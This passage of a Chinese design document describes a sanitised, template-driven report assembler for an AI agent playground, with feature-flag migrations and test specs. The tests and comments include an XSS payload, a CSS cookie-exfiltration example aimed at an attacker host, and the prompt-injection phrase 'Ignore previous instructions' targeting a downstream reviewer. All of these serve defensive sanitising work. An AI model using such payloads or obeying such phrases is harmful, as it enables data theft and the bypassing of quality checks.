        { group: ['*/ai-harness/lifecycle/**', '!*/ai-harness/facade'], message: '走 ai-harness/facade' },
      ],
    }],
  },
},
{
  files: ['src/modules/ai-engine/**/*.ts', '!src/modules/ai-engine/**/__tests__/**'],
  rules: {
    'no-restricted-imports': ['error', {
      patterns: [
        // ai-engine 不得依赖 ai-harness（除合法 adapter 端口实现）
        { group: ['*/ai-harness/**'], message: 'ai-engine 不得依赖 ai-harness（违反单向依赖）；如需端口适配，文件改为 *.adapter.ts 后申请豁免' },
      ],
    }],
  },
},
```

需删除的 v1.2 旧路径（已不存在）：

```diff
- { group: ['*/ai-engine/runtime/**'], message: '...' }   // 已迁出至 ai-harness
- { group: ['*/ai-kernel/**'], message: '...' }           // 已删
- { group: ['*/intent-gateway/**'], message: '...' }      // 已删（PR-X29 删空壳）
```

#### 5.1.7 facade 边界声明（v1.4 架构合规反馈）

新增公共符号必须从对应层 facade 暴露，不允许 ai-app 直 import 内部路径。本方案新增符号清单：

| 符号                                                                      | 内部位置                                                                | facade re-export                                                                                                                      |
| ------------------------------------------------------------------------- | ----------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| `ReportSegments` 接口                                                     | `ai-harness/evaluation/critique/report-artifact/report-segments.dto.ts` | `ai-harness/facade/index.ts` 加 `export type { ReportSegments }`                                                                      |
| `ReportTemplate` / `ReportTemplateSlot` / `SlotBodySource`                | 同上 `report-template.types.ts`                                         | 同上 `export type { ReportTemplate, ReportTemplateSlot, SlotBodySource }`                                                             |
| `MULTI_DIMENSION_REPORT_TEMPLATE` / `SINGLE_AGENT_FREEFORM_TEMPLATE` 常量 | 同上                                                                    | facade 加 `export { MULTI_DIMENSION_REPORT_TEMPLATE, SINGLE_AGENT_FREEFORM_TEMPLATE }`                                                |
| `expectedSectionCount(template, segments)`                                | 同上                                                                    | facade 加 `export { expectedSectionCount }`                                                                                           |
| `StructuralReportAssembler` service class                                 | `structural-report-assembler.service.ts`                                | facade 加 `export { StructuralReportAssembler }`                                                                                      |
| `MarkdownSanitizer` / `sanitizeMarkdownBody`                              | `ai-engine/content/markdown/markdown-sanitizer.util.ts`                 | `ai-engine/facade/index.ts` 加 `export { sanitizeMarkdownBody, type SanitizeOptions, type SanitizeResult, type SanitizeRuleApplied }` |
| `katexAwareSchema`                                                        | `frontend/components/playground/artifact-markdown.utils.ts`             | 前端无 facade 概念；该 util 文件仅供同目录组件 import；spec 单独 import 不算违规                                                      |

### 5.2 per-workspace 灰度基础设施（v1.3 MAJOR 详化）

**选型**：用 DB 表（不用 Redis Set），便于审计 + 与现有 admin UI 集成。

```sql
-- backend/prisma/migrations/20260507_feature_flag_workspace_grant/migration.sql
CREATE TABLE "feature_flag_workspace_grant" (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  flag_key TEXT NOT NULL,           -- 例如 'PLAYGROUND_USE_STRUCTURAL_ASSEMBLER'
  workspace_id UUID NOT NULL,
  enabled BOOLEAN NOT NULL DEFAULT true,
  granted_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  granted_by UUID NOT NULL,         -- v1.4 安全反馈：非空，audit log 必须可溯源
  expires_at TIMESTAMPTZ,           -- null = 长期；非 null 自动过期
  UNIQUE (flag_key, workspace_id)
);

CREATE INDEX idx_feature_flag_lookup ON "feature_flag_workspace_grant"(flag_key, workspace_id, enabled)
  WHERE enabled = true;

-- v1.4 安全反馈：审计日志表（grant / revoke / update 都进 log）
CREATE TABLE "feature_flag_audit_log" (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  flag_key TEXT NOT NULL,
  workspace_id UUID NOT NULL,
  action TEXT NOT NULL CHECK (action IN ('grant', 'revoke', 'update')),
  actor_user_id UUID NOT NULL,
  prev_enabled BOOLEAN,
  next_enabled BOOLEAN,
  reason TEXT,                       -- admin 必须填理由
  occurred_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

CREATE INDEX idx_audit_log_flag_workspace ON "feature_flag_audit_log"(flag_key, workspace_id, occurred_at DESC);
```

**Service**：

```typescript
@Injectable()
export class FeatureFlagService {
  async isEnabled(flagKey: string, workspaceId: string): Promise<boolean> {
    // 优先看 grant 表；缺失走 default（默认 false 灰度）
    const grant = await this.prisma.featureFlagWorkspaceGrant.findUnique({
      where: { flagKey_workspaceId: { flagKey, workspaceId } },
    });
    if (!grant || !grant.enabled) return false;
    if (grant.expiresAt && grant.expiresAt < new Date()) return false;
    return true;
  }
  // admin API：grant / revoke 走 RBAC 守卫（admin 角色 only）
}
```

**IDOR 防御（v1.3 安全修订）**：admin grant API 必须校验 `req.user.role === 'admin'` + `workspaceId` 来自 path/body 不来自 cookie；非 admin 用户调 grant API 直接 403。spec 锁普通用户调 grant 端点 expect 403。

**前端读取**：通过现有 `/api/v1/me/feature-flags` 端点暴露当前用户 workspace 已开启的 flags 列表，避免每个 mission 调用 service 走 DB。

### 实施顺序（v1.3）

1. **Day 1 (PR-A0 上半 + PR-A7 并行)**：PR-A0 字段 + ESLint + 安全；PR-A7 让现网立刻治标
2. **Day 1.5 (PR-A0 下半 + PR-A1)**：PR-A0 reconciliationReport schema migration + dump 脚本；PR-A1 sanitizer 主体
3. **Day 2.5 (PR-A2 + PR-A3)**：DTO + assembler 骨架 + builder 派发 + 子构建抽出
4. **Day 3.5 (PR-A4)**：spec 套件锁 invariants + per-template + 并发
5. **Day 4 (PR-A5a + PR-A5b)**：extractor 工具 + ctx schema 扩展
6. **Day 5 (PR-A5c)**：拆 stage + dispatcher hook + 事件注册
7. **Day 6 (PR-A5d)**：S10 调整 + 前端 preview skeleton
8. **Day 7-8 (PR-A6)**：rehype-sanitize + KaTeX schema + per-workspace 表 + 5 mission e2e
9. **Week 2 观察期**：监控 sanitizer 触发率 / sections 数量分布 / templateId 分布
10. **Week 2 末 (PR-A8)**：版本持久化 + 删 legacy

---

## 6. Spec 反向证据套件

**核心 spec**：`structural-report-assembler.spec.ts`，至少包含：

### 6.1 恶意 LLM 输入仍能产出正确 sections

| Fixture  | 描述                                           | 期望                                                   |
| -------- | ---------------------------------------------- | ------------------------------------------------------ |
| F-EVIL-1 | dim body 含孤儿 mermaid fence                  | sanitizer 补关，sections 数量正确                      |
| F-EVIL-2 | dim body 开头有 `# 大标题`                     | 降为 `### 大标题`，sections 数量正确                   |
| F-EVIL-3 | dim body 内嵌 5 个 `## 假标题`                 | 全部降级，sections 数量仍 = plan.dimensions.length + N |
| F-EVIL-4 | dim body 是空字符串                            | section 仍存在，body 留 `（本维度内容缺失）` 占位      |
| F-EVIL-5 | dim body 含未配对引用块 + 嵌套代码块           | sanitize 后稳定，sections 准确                         |
| F-EVIL-6 | crossDimAnalysis / riskAssessment 等可选段全空 | sections 仅保留有内容的段，dim sections 不变           |
| F-EVIL-7 | dim body 全是中文 + 中文标点 fence `「」`      | 不识别为 fence，sections 准确                          |

### 6.2 Invariant spec（v1.3 NB-6 修订 — template-aware）

```typescript
describe("invariant (template-aware)", () => {
  describe("MULTI_DIMENSION_REPORT_TEMPLATE", () => {
    it.each([1, 5, 12, 20])(
      "sections.length === expectedSectionCount(template, segments) (n=%i dims)",
      (n) => {
        const segments = buildSegmentsWithNDims(
          n,
          MULTI_DIMENSION_REPORT_TEMPLATE,
        );
        const result = assembler.assemble(segments);
        expect(result.sections.length).toBe(
          expectedSectionCount(MULTI_DIMENSION_REPORT_TEMPLATE, segments),
        );
      },
    );
  });

  describe("SINGLE_AGENT_FREEFORM_TEMPLATE", () => {
    it("sections.length === 1（freeform 仅一个 fixed slot，无 loop/optional）", () => {
      const segments = buildFreeformSegments();
      const result = assembler.assemble(segments);
      expect(result.sections.length).toBe(1);
      expect(
        expectedSectionCount(SINGLE_AGENT_FREEFORM_TEMPLATE, segments),
      ).toBe(1);
    });
  });

  it("每个 section 的 startOffset/endOffset 切出来必定以 ## 开头", () => {
    const result = assembler.assemble(buildRealisticSegments());
    for (const sec of result.sections) {
      const slice = result.content.fullMarkdown.slice(
        sec.startOffset,
        sec.endOffset,
      );
      expect(slice.startsWith(`## ${sec.title}`)).toBe(true);
    }
  });

  it("dim sections 顺序与 plan.dimensions 顺序一一对齐（仅 template 含 loop slot 时）", () => {
    const segments = buildSegments12Dims();
    const result = assembler.assemble(segments);
    const dimSecs = result.sections.filter((s) => s.type === "dimension");
    expect(dimSecs.map((s) => s.sourceDimensionId)).toEqual(
      segments.plan.dimensions.map((d) => d.id),
    );
  });

  it("templateId 持久化到 metadata（observability）— v1.4 用常量替代硬编码字面量", () => {
    const r1 = assembler.assemble(
      buildSegments(MULTI_DIMENSION_REPORT_TEMPLATE),
    );
    const r2 = assembler.assemble(
      buildSegments(SINGLE_AGENT_FREEFORM_TEMPLATE),
    );
    expect(r1.metadata.templateId).toBe(MULTI_DIMENSION_REPORT_TEMPLATE.id);
    expect(r2.metadata.templateId).toBe(SINGLE_AGENT_FREEFORM_TEMPLATE.id);
  });
});
```

### 6.3 prod fixture 回归（v1.2 B8 + 测试 B2 修订）

**反推方法（明确）**：

```sql
-- segments.plan.dimensions 来自
SELECT payload->'output'->'raw'->'dimensions'
FROM agent_playground_mission_events
WHERE mission_id='eafceb32-e8c0-4a8d-a59f-4cdbd33a97f1'
  AND type='agent-playground.stage:lifecycle'
  AND (payload->>'stepId') = 's2-leader-plan'
  AND (payload->>'status') = 'completed';

-- segments.bodies.perDimension[i].body 来自 chapter_drafts JOIN dim integrator output
SELECT
  cd.dimension AS dimension_id,
  string_agg(cd.content, E'\n\n' ORDER BY cd.chapter_index) AS body
FROM agent_playground_chapter_drafts cd
WHERE cd.mission_id='eafceb32-e8c0-4a8d-a59f-4cdbd33a97f1'
GROUP BY cd.dimension;

-- segments.bodies.crossDimAnalysis 来自
SELECT payload->'output'->'result'->>'reconciliationReport' AS body
FROM agent_playground_mission_events
WHERE mission_id='eafceb32-e8c0-4a8d-a59f-4cdbd33a97f1'
  AND type='agent-playground.stage:lifecycle'
  AND (payload->>'stepId') = 's5-reconciler'
  AND (payload->>'status') = 'completed';

-- segments.bodies.executiveSummary / preface / conclusion / recommendations 来自
-- S6 analyst.themeSummary + S10 leader.foreword.{各字段}（PR-A0 字段扩展后）
```

**dump 脚本**：`scripts/dump-playground-fixture.js <missionId>` —— 一次 dump 出 segments JSON + plan + 期望 ReportArtifact，存进 `frontend/__tests__/__fixtures__/playground/<missionId>.segments.json`

**v1.4 CI 可跑性**：dump 脚本一次性人工跑（mission 上线后），生成的 fixture JSON **commit 进 git**（路径 `frontend/__tests__/__fixtures__/playground/eafceb32.segments.json`），后续 CI 直接读 commit 进来的 JSON 不再 dump。spec 不依赖 prod DB 连接。换 mission 时再人工跑一次 dump 脚本 commit 新 fixture。

**多角度断言（不再单一 ≤8K 软阈值）**：

```typescript
const result = assembler.assemble(eafceb32Segments);

// (1) sections 数量按公式
expect(result.sections.length).toBe(
  3 + 12 + countOptional(eafceb32Segments.bodies) + 1,
); // expected 17-20 段

// (2) 每段字数分布健康（不集中在某一段）
const wordCounts = result.sections.map((s) => s.wordCount);
const dimWordCounts = result.sections
  .filter((s) => s.type === "dimension")
  .map((s) => s.wordCount);
const median = sorted(dimWordCounts)[Math.floor(dimWordCounts.length / 2)];
const max = Math.max(...dimWordCounts);
// 测试 N2 反馈：相对断言（避免每次写作风格调整就破例）
expect(max / median).toBeLessThanOrEqual(3); // 最大段 ≤ 中位数 3 倍

// (3) sections 顺序与 plan.dimensions 严格对齐
const dimSections = result.sections.filter((s) => s.type === "dimension");
expect(dimSections.map((s) => s.sourceDimensionId)).toEqual(
  eafceb32Segments.plan.dimensions.map((d) => d.id),
);

// (4) 没有 section 长度为 0 / null（B7 partial failure 情况下显示占位文字）
for (const s of result.sections) {
  expect(s.wordCount).toBeGreaterThan(0);
}

// (5) figures.sectionId 全部能映射到一个 section（测试 M2）
for (const fig of result.figures) {
  expect(result.sections.some((s) => s.id === fig.sectionId)).toBe(true);
}

// (6) citations.occurrences[].offset 全在 fullMarkdown 范围内
for (const c of result.citations) {
  for (const occ of c.occurrences) {
    expect(occ.offset).toBeGreaterThanOrEqual(0);
    expect(occ.offset).toBeLessThan(result.content.fullMarkdown.length);
  }
}
```

### 6.4 v1.2 新增 spec（多评审反馈整合）

| 类别                      | spec 名                                                                                                                   | 反馈来源              |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------- | --------------------- |
| **并发**                  | `assemble() 在 Promise.all 中并发调用，sections 互不污染`                                                                 | 架构合规 B3 + 测试 M3 |
| **partial dim failure**   | `perDimension 含 body=null 项时，该 section 显示占位文字 "(本维度内容缺失)"，sections.length 仍 = plan.dim 全数 + 固定段` | 代码审 B1 + 代码审 N4 |
| **figures 重映射**        | `S8B remediation 重生成某 dim 后，全量 assemble() → figures.sectionId 仍指向正确 section`                                 | 代码审 M5 + 测试 M2   |
| **feature flag 状态机**   | `flag off → on → off 切换，已存 mission 仍能读，新 mission 不受污染`                                                      | 测试 M4               |
| **legacy fuzzy match**    | `PR-A7 fuzzy match 阈值 ≥ 0.7 时 dim 名 90% 能正确对齐（5+ 数据点）`                                                      | 代码审 N3             |
| **B9 安全注入**           | `dim.name 含 \r\n /   / 200+ 字符时被 strip 到合规形式后才进 sections.title`                                              | 安全 C-1              |
| **B11 ReDoS**             | `sanitizer 收到 100KB+ 表格行 / 2MB+ 输入时分别 noop / throw InputTooLargeError`                                          | 安全 H-2              |
| **prompt injection 隔离** | `body 含"Ignore previous instructions"等 pattern 时被 detect + redact`                                                    | 安全 M-1              |

### 6.5 stage integration spec（v1.3 NB-5 新增）

**反馈来源**：测试二轮 BLOCKER-NEW-1 — assembler 单元 spec 通过不代表 ctx 链路通。s8-pre 写 ctx key A、s8-final 读 ctx key B（拼写不一致）会静默拿到 undefined，produce 无 preface 报告。

**Spec 文件**：`backend/src/modules/ai-app/agent-playground/services/mission/workflow/__tests__/s8-stage-integration.spec.ts`

```typescript
describe("s8-pre → S10 → s8-final ctx 链路集成", () => {
  let ctx: MissionContext;
  let dispatcher: PlaygroundPipelineDispatcherService;
  let spyAdapter: IBroadcastAdapter & { received: DomainEvent[] };

  /**
   * v1.4 测试反馈：s8-pre 不调 LLM（纯 extractor + 拼装），但读 ctx 中前置 stage 产物。
   * 必须显式构造前置 ctx 状态而非 mock LLM。该 helper 模拟"S3-S6/S9 已完成"的快照。
   */
  function buildPriorCtx(overrides?: Partial<MissionContext>): MissionContext {
    return {
      missionId: "m-test-1",
      userId: "u-test",
      plan: {
        themeSummary: "...",
        dimensions: [{ id: "d1", name: "维度一", rationale: "..." }],
      },
      analystOutput: { themeSummary: "..", actionableRecommendations: [] },
      reconcilerOutput: { reconciliationReport: { markdown: ".." } },
      researcherResults: [
        { dimensionId: "d1", fullMarkdown: "## 维度一\n..." },
      ],
      criticVerdict: { blindspots: [] },
      ...overrides,
    } as MissionContext;
  }

  beforeEach(async () => {
    // 真 DomainEventBus + spy adapter；真 dispatcher + 真 mission-stage-bindings
    // 不 mock LLM（s8-pre 路径不调 LLM）；S10 仍 mock 因走 LLM
    ctx = buildPriorCtx();
  });

  it("s8-pre 完成后 ctx.reportSegments 有值，emit report:preview 事件", async () => {
    await dispatcher.executeStage("s8-pre", ctx);
    expect(ctx.reportSegments).toBeDefined();
    expect(ctx.reportSegments?.bodies.executiveSummary).toBeTruthy();
    expect(
      spyAdapter.received.find(
        (e) => e.type === "agent-playground.report:preview",
      ),
    ).toBeDefined();
  });

  it("S10 写 ctx.leaderForeword（不写 ctx.reportArtifact.metadata.leaderForeword 旧路径）", async () => {
    await dispatcher.executeStage("s10-leader-foreword-and-signoff", ctx);
    expect(ctx.leaderForeword).toBeDefined();
    expect(ctx.leaderForeword?.preface).toBeTruthy();
    // 反向证据：旧路径不再写
    expect(ctx.reportArtifact?.metadata.leaderForeword).toBeUndefined();
  });

  it("s8-final 读 ctx.reportSegments + ctx.leaderForeword 拼装 ReportArtifact", async () => {
    ctx.reportSegments = buildFakeSegments();
    ctx.leaderForeword = buildFakeForeword();
    await dispatcher.executeStage("s8-final", ctx);
    expect(ctx.reportArtifact).toBeDefined();
    // preface 来自 ctx.leaderForeword，不是 ctx.reportSegments
    expect(ctx.reportArtifact?.content.fullMarkdown).toContain(
      ctx.leaderForeword.preface,
    );
  });

  it("ctx schema 反向证据：s8-final 在 ctx.leaderForeword 缺失时降级（不 throw）", async () => {
    ctx.reportSegments = buildFakeSegments();
    ctx.leaderForeword = undefined;
    await expect(
      dispatcher.executeStage("s8-final", ctx),
    ).resolves.not.toThrow();
    // 降级：preface 段使用 占位文字 "(前言生成中)"
    expect(ctx.reportArtifact).toBeDefined();
  });

  it("AGENT_PLAYGROUND_EVENTS 注册了 report:preview 类型（防 baseline 漂移）", () => {
    const types = AGENT_PLAYGROUND_EVENTS.map((e) => e.type);
    expect(types).toContain("agent-playground.report:preview");
  });

  // v1.4 测试反馈：真端到端链路（s8-pre 真跑 → S10 mock LLM → s8-final 真跑）
  it("e2e: s8-pre → S10 → s8-final 链路 ctx 状态正确传递", async () => {
    // s8-pre 真跑（读 ctx.analystOutput / .reconcilerOutput / .researcherResults / .criticVerdict）
    await dispatcher.executeStage("s8-pre", ctx);
    expect(ctx.reportSegments).toBeDefined();

    // S10 mock：模拟 LLM 返回 leaderForeword
    jest.spyOn(leaderAgent, "invoke").mockResolvedValueOnce({
      preface: "PREFACE_TOKEN",
      conclusion: "CONCLUSION_TOKEN",
      recommendations: "REC_TOKEN",
      signoff: { signed: true, reasoning: "ok" },
    });
    await dispatcher.executeStage("s10-leader-foreword-and-signoff", ctx);
    expect(ctx.leaderForeword?.preface).toBe("PREFACE_TOKEN");

    // s8-final 真跑（读 ctx.reportSegments + ctx.leaderForeword）
    await dispatcher.executeStage("s8-final", ctx);
    expect(ctx.reportArtifact).toBeDefined();
    // 端到端验证：leaderForeword 文字一定出现在最终 fullMarkdown
    expect(ctx.reportArtifact!.content.fullMarkdown).toContain("PREFACE_TOKEN");
    expect(ctx.reportArtifact!.content.fullMarkdown).toContain(
      "CONCLUSION_TOKEN",
    );
  });
});
```

### 6.6 rehype-sanitize KaTeX schema spec（v1.3 NB-3 新增）

**反馈来源**：代码审二轮 BLOCKER-NEW-3 — `defaultSchema` 把 MathML 标签全部剥掉，KaTeX 渲染破。

**Spec 拆分（v1.4 测试反馈：JSDOM MathML 假阳性避坑）**：

1. **schema 单元 spec**（vitest + JSDOM 即可，不依赖 DOM 渲染）
   - 文件：`frontend/__tests__/components/playground/artifact-markdown-schema.spec.ts`
   - 仅验 `katexAwareSchema` 配置正确性（tagNames / attributes / className regex）
2. **DOM 集成 spec**（Playwright，避 JSDOM 不渲染 MathML 的假阳性）
   - 文件：`frontend/e2e/playground/artifact-markdown-katex.spec.ts`
   - 真浏览器渲染验 `<math>` / `<svg>` 实际产出 + 攻击输入被剥

```typescript
// schema 单元 spec（JSDOM 安全）
describe("katexAwareSchema 配置", () => {
  it("包含 MathML + SVG tags", () => {
    expect(katexAwareSchema.tagNames).toContain("math");
    expect(katexAwareSchema.tagNames).toContain("semantics");
    expect(katexAwareSchema.tagNames).toContain("mrow");
    expect(katexAwareSchema.tagNames).toContain("svg");
    expect(katexAwareSchema.tagNames).toContain("path");
  });
  it("不放开 script / iframe / object / embed", () => {
    expect(katexAwareSchema.tagNames).not.toContain("script");
    expect(katexAwareSchema.tagNames).not.toContain("iframe");
    expect(katexAwareSchema.tagNames).not.toContain("object");
    expect(katexAwareSchema.tagNames).not.toContain("embed");
  });
  it("mstyle 属性仅允许 scriptlevel / displaystyle", () => {
    expect(katexAwareSchema.attributes.mstyle).toEqual([
      "scriptlevel",
      "displaystyle",
    ]);
  });
  it("全局 attributes 不含 style 属性", () => {
    const starAttrs = katexAwareSchema.attributes["*"] as Array<unknown>;
    const styleEntry = starAttrs.find((a) =>
      Array.isArray(a) ? a[0] === "style" : a === "style",
    );
    expect(styleEntry).toBeUndefined();
  });
});

// DOM 集成 spec（Playwright，真浏览器）
test.describe("ArtifactMarkdown KaTeX", () => {
  test("KaTeX 公式渲染产出 <math> + <svg> + .katex class", async ({ page }) => {
    await page.goto(
      "/test/artifact-markdown?content=" +
        encodeURIComponent("$$ \\frac{a}{b} $$"),
    );
    await expect(page.locator("math")).toBeVisible();
    await expect(page.locator(".katex")).toBeVisible();
  });
  test("XSS 攻击 onerror / javascript: 被剥", async ({ page }) => {
    await page.goto(
      "/test/artifact-markdown?content=" +
        encodeURIComponent('<img src=x onerror="alert(1)">'),
    );
    const img = page.locator("img");
    await expect(img).toHaveAttribute("onerror", /^$/); // null or empty
  });
});
```

**实现 — 前端 schema 配置（v1.4 完整）**：

```typescript
// frontend/components/playground/artifact-markdown.utils.ts
import { defaultSchema } from "rehype-sanitize";

// MathML 标签（KaTeX MathML 输出）
const KATEX_MATHML_TAGS = [
  "math",
  "semantics",
  "mrow",
  "mi",
  "mn",
  "mo",
  "msup",
  "msub",
  "mfrac",
  "msqrt",
  "mroot",
  "mtext",
  "annotation",
  "annotation-xml",
  "mtable",
  "mtr",
  "mtd",
  "munderover",
  "mover",
  "munder",
  "mspace",
  "mstyle",
  "mphantom",
  "mpadded",
  "menclose",
];

// SVG 标签（KaTeX displayMode 输出，v1.4 代码审反馈补全）
const KATEX_SVG_TAGS = [
  "svg",
  "path",
  "g",
  "line",
  "rect",
  "use",
  "defs",
  "symbol",
];

// KaTeX 内部使用但不以 'katex' 开头的 className（v1.4 代码审反馈：避免布局错位）
// 来源：grep katex CSS 找到的内部 class
const KATEX_INTERNAL_CLASSES = new Set([
  "katex",
  "katex-html",
  "katex-display",
  "katex-mathml",
  "base",
  "strut",
  "vlist",
  "vlist-r",
  "vlist-s",
  "vlist-t",
  "vlist-t2",
  "mord",
  "mrel",
  "mbin",
  "mop",
  "mopen",
  "mclose",
  "mpunct",
  "minner",
  "accent",
  "accent-body",
  "overlay",
  "frac-line",
  "sqrt",
  "sqrt-line",
  "sizing",
  "fontsize-ensurer",
  "delimsizing",
  "op-symbol",
]);

const ALLOWED_CLASS_RE = new RegExp(
  `^(?:katex(?:[a-zA-Z0-9_-]*)?|${[...KATEX_INTERNAL_CLASSES].join("|")})$`,
);

export const katexAwareSchema = {
  ...defaultSchema,
  tagNames: [
    ...(defaultSchema.tagNames ?? []),
    ...KATEX_MATHML_TAGS,
    ...KATEX_SVG_TAGS,
  ],
  attributes: {
    ...defaultSchema.attributes,
    "*": [
      ...(defaultSchema.attributes?.["*"] ?? []),
      ["className", ALLOWED_CLASS_RE],
      // 不放开 style（防 CSS 注入）/ 不放开任何 on* 事件属性
    ],
    math: ["xmlns", "display"],
    annotation: ["encoding"],
    "annotation-xml": ["encoding"],
    // v1.4 安全反馈：mstyle 不放开 mathcolor / mathbackground（部分浏览器映射到 CSS）
    mstyle: ["scriptlevel", "displaystyle"], // 仅放开纯结构属性
    // SVG 标签属性白名单（KaTeX displayMode 用）
    svg: ["xmlns", "width", "height", "viewBox", "preserveAspectRatio"],
    path: ["d"],
    g: ["transform"],
    line: ["x1", "x2", "y1", "y2", "stroke-width"],
    rect: ["x", "y", "width", "height"],
    use: ["xlink:href", "href", "x", "y"],
  },
};
```

> 注：`style` 属性全局不放开（防 CSS 注入 / data exfiltration via `background-image: url('https://attacker/?'+document.cookie)`）；KaTeX 输出靠 className + SVG path 描述，不依赖 inline style；`mstyle` 仅允许 `scriptlevel`/`displaystyle` 两个 MathML 纯结构属性，拒 `mathcolor`/`mathbackground` 这类映射到 CSS 的属性。

---

## 7. 风险点与回滚（v1.2 扩）

| 风险                                                                                            | 影响                                                                                          | 缓解                                                                                                                                   |
| ----------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| writer prompt 改造后 LLM 输出形态变化导致正文质量下降                                           | mission 报告字数减少 / 内容割裂                                                               | feature flag 默认关，灰度开放；prod 5 个 mission e2e 覆盖 zh/en × brief/standard/epic                                                  |
| 历史 mission（report_full 是 legacy 形态）渲染异常                                              | 老报告打不开                                                                                  | legacy assembler 保留至少 1 个 release 周期；`isReportArtifact` 检测仍兼容旧 schema                                                    |
| structural assembler 与 legacy 的 quality 指标计算 drift                                        | 老 mission 评分 vs 新 mission 评分不可比                                                      | **PR-A3 把 quality 子构建独立服务化**（`QualityVerdictBuilder`），新老共用，避免分叉 — 架构师 M3 反馈                                  |
| 一次性切流量大 → 多个 prod mission 同时崩                                                       | 用户群体性受影响                                                                              | feature flag 按 **workspaceId** 灰度（per-workspace allowlist，安全 L-2），不再全局 hash                                               |
| sanitizer 误剥离了 LLM 真要的 # 标题                                                            | 报告丢内容                                                                                    | sanitizer 默认仅剥首行匹配 plan.dim.name 的 H2（架构师 M5），其他 H2 降级为 H3；指标上报内部 metrics 不暴露 API                        |
| **cache hit / rerun incremental 路径**（v1.2 架构师 M4 反馈）                                   | 历史 chapter_drafts 回灌时 segments 来源是 DB 不是 stage 实时；旧字段 schema 与新代码期待不符 | PR-A0 完成字段对齐时同步 ctx-hydrator schema migration；rerun 路径 spec 覆盖                                                           |
| **sanitizer 自身 throw / catastrophic backtracking**（v1.2 架构合规 M3 反馈，反向洞察 #4 + #5） | retry storm，warn log 刷屏                                                                    | sanitizer 入口 try-catch + 按 `missionId` 维度记 `consecutiveFailures`，超 3 次跳过 sanitizer 直接传原 body，再失败回 legacy assembler |
| **prompt injection 二次注入**（v1.2 安全 M-1）                                                  | 恶意 LLM body 嵌"Ignore previous instructions"传到下游 reviewer 绕过质量门                    | sanitizer 加 `instruction-injection-redacted` 规则；S8B 给 LLM 喂 body 时用 XML delimiter 隔离                                         |
| **figures.sectionId / citations.offset 在 S8B remediation 后失配**（v1.2 代码审 M5 + 测试 M2）  | 图片关联到错误章节 / 引用锚点漂移                                                             | S8B remediation 后**全量重跑 S8-final.assemble()**（不部分更新），spec 锁 figures 映射                                                 |
| **report_full sanitizer 规则升级后历史数据不一致**（v1.2 安全 L-1）                             | 老报告保留新版本认为不安全的内容                                                              | `ReportArtifact.metadata.sanitizerVersion` 字段；前端读到老版本可触发后台重 sanitize                                                   |

**回滚预案**：

- feature flag 一键回 false → s8 走 legacy assembler 路径，1 分钟生效
- 若 structural assembler 自身 throw → s8 catch + log warn + 走 legacy fallback，永远不让 mission 因 assembler bug 整体失败

---

## 8. 不在范围（明确切割）

- ❌ custom-agents 自定义 pipeline 形态（独立 v5.2 议题）
- ❌ ReconciliationPanel 前端 JSON-as-string 渲染（独立 task #10，Screenshot 38 问题）
- ❌ Writer S7 outline / S8b quality enhancement / S9 critic 流程改造
- ❌ Critic L4 评分 / Leader signoff 阈值
- ❌ 报告版本化 / 章节级重写（已是 PR-#85 单独议题）
- ❌ chapter pipeline integrator 的 dim doc 内部结构（每个 dim 内 H3 级别仍由 LLM 决定，本 redesign 只管 dim 之间的 H2 边界）

---

## 9. 后续可做（v1.1+）

- 把 sanitizer 升级为可注册规则集，业务方可加自己的规则（office 模块需要表格/图片处理 / social 模块需要 emoji 处理）
- structural assembler 抽象出 `ReportTemplate` 接口，让不同业务定义自己的 template（research vs office vs writing）
- LLM 输出 trace 持久化 + 失败模式 ML 分析，反向反哺 prompt 工程

---

## 10. 决策日志

| 日期            | 决策                                                                                                   | 理由                                                                                                                                                                                                                                                       |
| --------------- | ------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 2026-05-06      | 采纳"backend 控结构"方向，拒绝"加 sanitizer + assembler 防御"单点方案                                  | 模型替换不可控，单点防御永远滞后于 LLM 新姿势                                                                                                                                                                                                              |
| 2026-05-06      | sanitizer 归 ai-engine（跨业务复用），structural assembler 归 ai-harness（deep research 共用）         | 按 CLAUDE.md 能力归属判断："明天换业务还能复用吗"                                                                                                                                                                                                          |
| 2026-05-06      | 新老 assembler 共存 1 个 release 周期，feature flag 灰度切流                                           | 风险控制；用户群体性故障一键回滚                                                                                                                                                                                                                           |
| 2026-05-06      | 不在本 PR 改 custom agent pipeline 形态                                                                | 范围切割，避免大锅饭；custom agent 独立议题                                                                                                                                                                                                                |
| 2026-05-06 v1.1 | **S8 不拆 prompt 多次调 LLM，改为采集 + 拼装 thin orchestration（0 主路径 LLM call）**                 | 用户 Q1+Q2 反馈：分段 prompt 多调 LLM 会重复成本 + 上下文风险。事实上各 segment 已在现有 stage 产出（per-dim integrator / analyst / leader / critic / reconciler），S8 只需"剥 H2 + 拼装"                                                                  |
| 2026-05-06 v1.1 | **S10 leader foreword 完成后 refill 模式回填 preface/conclusion**（不调整 stage 顺序）                 | S10 当前在 S8 之后是合理时序（leader 看到完整报告再写前言）；用 assembler.refillSegment() 接口让 S10 后回填，避免改 stage 顺序的大改动                                                                                                                     |
| 2026-05-06 v1.1 | **质量闭环复用既有 S8B sectionSelfEval + sectionRemediation**，不新建                                  | S8B 已经按 section 跑闭环；structural assembler 让 sections 数量稳定 → S8B 评分点不漂移 → 现有质量机制顺势加强                                                                                                                                             |
| 2026-05-06 v1.2 | **新增前置 PR-A0 字段对齐**（B1+B4+B9 合一）                                                           | 评审实证当前 dto 缺 `recommendations / conclusion / preface / actionableRecommendations` 字段；ESLint Section 10 锁的是已删除路径；dim.name 缺 CRLF 校验。三项必须开工前完成                                                                               |
| 2026-05-06 v1.2 | **拒绝 refill 模式，拆 S8 为 s8-pre + s8-final**（B2）                                                 | 4 路评审一致 BLOCK；半成品 ReportArtifact 破坏不可变契约 + offset 重算 + figures sectionId / citations.offset 重映射太复杂。拆 stage 让 ReportArtifact 一次性产出                                                                                          |
| 2026-05-06 v1.2 | **invariant 公式统一为 `fixed(4) + plan.dim + optional(0-4)`**（B3）                                   | v1.1 三处自相矛盾（+9 / +5+4 / 21 段）；统一公式让 spec / fallback 基准一致                                                                                                                                                                                |
